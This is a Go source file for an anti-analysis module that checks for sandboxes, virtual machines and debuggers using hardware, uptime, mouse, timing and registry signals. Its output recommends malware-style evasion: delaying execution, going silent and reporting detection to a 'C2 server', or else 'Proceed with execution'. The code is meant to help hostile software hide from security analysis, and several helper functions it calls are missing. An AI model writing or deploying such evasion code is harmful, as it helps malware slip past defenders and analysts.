package main

import (
	"encoding/json"
	"fmt"
	"os"
	"runtime"
	"strings"
	"time"
)

// AdvancedSandboxDetection performs deep sandbox/VM detection with structured results.
type AdvancedSandboxDetection struct {
	startTime time.Time
}

// NewAdvancedSandboxDetection creates a new detector.
func NewAdvancedSandboxDetection() *AdvancedSandboxDetection {
	return &AdvancedSandboxDetection{startTime: time.Now()}
}

// CheckResult represents a single detection check result.
type CheckResult struct {
	Name        string      `json:"name"`
	Detected    bool        `json:"detected"`
	Weight      int         `json:"weight"`
	Description string      `json:"description"`
	Value       interface{} `json:"value,omitempty"`
}

// AdvancedSandboxResult contains the full detection output.
type AdvancedSandboxResult struct {
	IsSandbox       bool          `json:"is_sandbox"`
	Confidence      int           `json:"confidence"`
	Checks          []CheckResult `json:"checks"`
	SuspiciousCount int           `json:"suspicious_count"`
	Recommendations []string      `json:"recommendations"`
}

// Detect performs all advanced checks and returns structured JSON results.
func (d *AdvancedSandboxDetection) Detect() *AdvancedSandboxResult {
	result := &AdvancedSandboxResult{
		IsSandbox:  false,
		Confidence: 0,
		Checks:     []CheckResult{},
	}

	checks := []struct {
		name   string
		desc   string
		weight int
		fn     func() (bool, interface{})
	}{
		{"CPU Cores", "CPU count < 2 indicates sandbox", 8, d.checkCPUCores},
		{"RAM Size", "RAM < 4GB indicates sandbox", 10, d.checkRAMSize},
		{"Disk Size", "Disk < 60GB indicates sandbox", 8, d.checkDiskSize},
		{"Process Count", "Few processes indicate sandbox", 12, d.checkProcessCount},
		{"Recent File Activity", "Few recent files indicate fresh VM", 7, d.checkRecentFiles},
		{"VM MAC Address", "Known VM vendor MAC prefix", 14, d.checkVMMACAdvanced},
		{"VM Registry Keys", "VM software registry artifacts", 15, d.checkVMRegistry},
		{"System Uptime", "Uptime < 10 min indicates fresh boot", 10, d.checkUptime},
		{"Display Resolution", "Resolution < 1024x768 indicates sandbox", 6, d.checkDisplayResolution},
		{"Mouse Activity", "No mouse movement indicates sandbox", 5, d.checkMouseActivity},
		{"Sleep Acceleration", "Time dilation indicates sandbox", 12, d.checkSleepAcceleration},
		{"RDTSC Timing", "Timing variance indicates debugger", 13, d.checkRDTSC},
		{"Hardware Breakpoints", "DR registers indicate debugging", 16, d.checkHardwareBreakpoints},
		{"Domain Join", "Domain-joined machines are less likely sandboxes", 5, d.checkDomainJoin},
	}

	suspiciousCount := 0
	totalWeight := 0

	for _, c := range checks {
		detected, val := c.fn()
		cr := CheckResult{
			Name:        c.name,
			Detected:    detected,
			Weight:      c.weight,
			Description: c.desc,
			Value:       val,
		}
		result.Checks = append(result.Checks, cr)
		if detected {
			suspiciousCount++
			totalWeight += c.weight
		}
	}

	result.SuspiciousCount = suspiciousCount
	result.Confidence = minInt(100, totalWeight)
	result.IsSandbox = result.Confidence >= 45

	if result.IsSandbox {
		result.Recommendations = []string{
			"Delay execution for 1-5 minutes",
			"Enter silent mode (no sensitive operations)",
			"Report detection to C2 server",
		}
	} else {
		result.Recommendations = []string{"Proceed with execution"}
	}

	return result
}

func (d *AdvancedSandboxDetection) checkCPUCores() (bool, interface{}) {
	n := runtime.NumCPU()
	return n < 2, n
}

func (d *AdvancedSandboxDetection) checkRAMSize() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	ramGB := getWindowsRAMGB()
	return ramGB < 4.0, fmt.Sprintf("%.1f GB", ramGB)
}

func (d *AdvancedSandboxDetection) checkDiskSize() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	diskGB := getWindowsDiskGB("C:\\")
	return diskGB < 60, fmt.Sprintf("%.0f GB", diskGB)
}

func (d *AdvancedSandboxDetection) checkProcessCount() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	count := getWindowsProcessCount()
	return count < 50, count
}

func (d *AdvancedSandboxDetection) checkRecentFiles() (bool, interface{}) {
	dirs := []string{
		os.Getenv("USERPROFILE") + "\\Documents",
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Downloads",
		"C:\\Users\\Public\\Documents",
	}

	threshold := time.Now().Add(-7 * 24 * time.Hour)
	recentCount := 0

	for _, dir := range dirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			info, err := entry.Info()
			if err != nil {
				continue
			}
			if info.ModTime().After(threshold) {
				recentCount++
			}
		}
	}
	return recentCount < 10, recentCount
}

func (d *AdvancedSandboxDetection) checkVMMACAdvanced() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	found := getVMVendorMACs()
	return len(found) > 0, found
}

func (d *AdvancedSandboxDetection) checkVMRegistry() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	found := checkVMRegistryKeys()
	return len(found) > 0, found
}

func (d *AdvancedSandboxDetection) checkUptime() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	uptimeMin := getWindowsUptimeMinutes()
	return uptimeMin < 10, fmt.Sprintf("%.0f min", uptimeMin)
}

func (d *AdvancedSandboxDetection) checkDisplayResolution() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	w, h := getDesktopResolution()
	suspicious := w < 1024 || h < 768
	return suspicious, fmt.Sprintf("%dx%d", w, h)
}

func (d *AdvancedSandboxDetection) checkMouseActivity() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	moved := checkMouseMoved()
	return !moved, moved
}

func (d *AdvancedSandboxDetection) checkSleepAcceleration() (bool, interface{}) {
	requested := 200 * time.Millisecond
	start := time.Now()
	time.Sleep(requested)
	elapsed := time.Since(start)
	accelerated := elapsed < requested/2
	return accelerated, fmt.Sprintf("requested=%v actual=%v", requested, elapsed)
}

func (d *AdvancedSandboxDetection) checkRDTSC() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	suspect := checkRDTSCVariance()
	return suspect, "timing variance detected"
}

func (d *AdvancedSandboxDetection) checkHardwareBreakpoints() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	found := checkDRRegisters()
	return found, found
}

func (d *AdvancedSandboxDetection) checkDomainJoin() (bool, interface{}) {
	if runtime.GOOS != "windows" {
		return false, "unsupported OS"
	}
	domain := os.Getenv("USERDNSDOMAIN")
	joined := domain != ""
	// Being domain-joined is a positive signal (NOT sandbox)
	return false, joined
}

// RunAdvancedSandboxCheck runs the full detection and returns JSON output for the task.
func RunAdvancedSandboxCheck() string {
	detector := NewAdvancedSandboxDetection()
	result := detector.Detect()

	data, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return fmt.Sprintf(`{"error":"%s"}`, err.Error())
	}
	return string(data)
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// sanitizeForJSON cleans a string for JSON output.
func sanitizeForJSON(s string) string {
	s = strings.ReplaceAll(s, "\\", "\\\\")
	s = strings.ReplaceAll(s, "\"", "\\\"")
	return s
}
